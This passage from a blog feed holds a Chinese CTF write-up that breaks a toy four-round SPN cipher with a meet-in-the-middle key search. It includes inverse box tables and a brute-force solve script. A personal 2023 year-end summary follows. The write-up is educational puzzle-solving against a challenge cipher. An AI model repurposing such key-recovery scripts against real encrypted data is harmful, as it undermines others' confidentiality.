class="keyword">or</span> i == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()</span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">7</span>:-<span class="number">1</span>] == hash_value</span><br><span class="line"></span><br><span class="line">XX = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(enc(XX,K))</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1]</span></span><br><span class="line"><span class="comment"># [0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0]</span></span><br></pre></td></tr></table></figure><p>刚看到题用的是差分，因为一般类DES的考法也就差分&#x2F;线性，翻了几篇博客没懂就没往下想了，可能官方解法是差分吧。</p><p>逆s, p 盒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">rePbox = [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line">reSbox=[<span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><p>逆加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func4</span>(<span class="params">X,K</span>): <span class="comment"># 第四轮</span></span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line">    kstart =  <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] = Y[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func3</span>(<span class="params">X</span>): <span class="comment"># 前3轮</span></span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Y</span><br></pre></td></tr></table></figure><h2 id="0x06-2-中间相遇攻击"><a href="#0x06-2-中间相遇攻击" class="headerlink" title="0x06.2 中间相遇攻击"></a>0x06.2 中间相遇攻击</h2><p>中间相遇攻击，明文 ‘0’*16 的两轮加密结果和对应的密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>] </span><br></pre></td></tr></table></figure><p>两轮解密的结果相同。把加密结果存在一个dic 里面，然后用相同的key对密文解密，在dic 里面查，如果查到的话可能就是，再用其他密文检验以下。</p><p>中间还遇到一个毛病：key只存了12 bit（因为只需要12bit ），4096个数据，如果range 设大的话就会覆盖 :( ，要再加一个循环。先构造一个key检验一下,有结果，于是开爆，花了近7h 成功出结果 :)</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202402051007987.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">rePbox = [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line">reSbox=[<span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func4</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line">    kstart =  <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] = Y[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func3</span>(<span class="params">X</span>):</span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line"></span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ss = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XX = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">XX[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> trange(<span class="number">0</span>,<span class="number">2</span>**<span class="number">20</span>,<span class="number">5000</span>):</span><br><span class="line">    FLAG = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">dict</span>()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start,start+<span class="number">5000</span>):</span><br><span class="line">        K = bin_to_list(j,<span class="number">20</span>)</span><br><span class="line">        Y = round_func(XX,<span class="number">1</span>,K)</span><br><span class="line">        Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">        kstart=<span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">            Y[i] = Y[i] ^ K[kstart+i]</span><br><span class="line">        A[<span class="built_in">str</span>(Y[:<span class="number">12</span>])] = K </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    ss = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">        XXX = ss.copy()</span><br><span class="line">        K = bin_to_list(j,<span class="number">20</span>)</span><br><span class="line">        kstart = <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            XXX[i] = XXX[i]^K[kstart+i]</span><br><span class="line"></span><br><span class="line">        Y = re_round_func4(XXX,K)</span><br><span class="line">        Y = re_round_func3(Y)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(Y[:<span class="number">12</span>]) <span class="keyword">in</span> A:</span><br><span class="line">            tmpk = A[<span class="built_in">str</span>(Y[:<span class="number">12</span>])][:<span class="number">12</span>]+K[:]</span><br><span class="line">            <span class="keyword">if</span> enc([<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) ==  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>] <span class="keyword">and</span> \</span><br><span class="line">                enc([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) == [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>] <span class="keyword">and</span> \</span><br><span class="line">                enc([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) == [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>] <span class="keyword">and</span> \</span><br><span class="line">                enc([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) == [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[++]&quot;</span>,tmpk)</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x01-Not-Wiener&quot;&gt;&lt;a href=&quot;#0x01-Not-Wiener&quot; class=&quot;headerlink&quot; title=&quot;0x</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023-Summary</title>
    <link href="http://example.com/2023/12/31/2023-Summary/"/>
    <id>http://example.com/2023/12/31/2023-Summary/</id>
    <published>2023-12-31T15:53:25.000Z</published>
    <updated>2023-12-31T17:31:48.711Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。</p><p>送别大四两位毕业的学长师傅。</p><blockquote><p>长亭外，古道边，芳草碧连天<br>晚风拂柳笛声残，夕阳山外山</p><p>天之涯，地之角，知交半零落<br>一瓢浊酒尽余欢，今宵别梦寒</p></blockquote><p>看的书：</p><ul><li><p>《科幻世界》一本没落下，补完了。现在感觉国内中短篇科幻写的就是依托，就连《依尘》这种堆砌文藻、数学公式显得自己很牛逼的东西都端上来了。</p><blockquote><p>不过SFW科幻大会很过瘾，大刘很和蔼一老头，乐呵呵给我签名。</p><p>王诺诺好看捏（抬走） </p></blockquote></li><li><p>《战争与和平》：读到三四百页鸽了，过了一段时间从头读。我就喜欢这味！仿佛身临其境体会人物的喜怒哀乐，一言一行。字里行间更是金句频出。</p><blockquote><p>此生必去一趟俄罗斯，还愿。</p></blockquote></li><li><p>一些论文：就不一一贴了，有的看完有的鸽了，笔记也记的稀稀拉拉，太懒了。</p></li><li><p>技术方面：《Go 语言编程之旅：一起用 Go 做项目》非常好Go，让我的代码力提升。基于这本书和阿鲁师傅的提点，给我出题提供了灵感和技术支撑；《<em>Learn You a Haskell</em>》，用公式写程序，非常优雅上流。</p></li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">quicksort</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; [a]  </span><br><span class="line"><span class="title">quicksort</span> [] = []  </span><br><span class="line"><span class="title">quicksort</span> (x:xs) =   </span><br><span class="line">    <span class="keyword">let</span> smallerSorted = quicksort [a | a &lt;- xs, a &lt;= x]  </span><br><span class="line">        biggerSorted = quicksort [a | a &lt;- xs, a &gt; x]  </span><br><span class="line">    <span class="keyword">in</span>  smallerSorted ++ [x] ++ biggerSorted  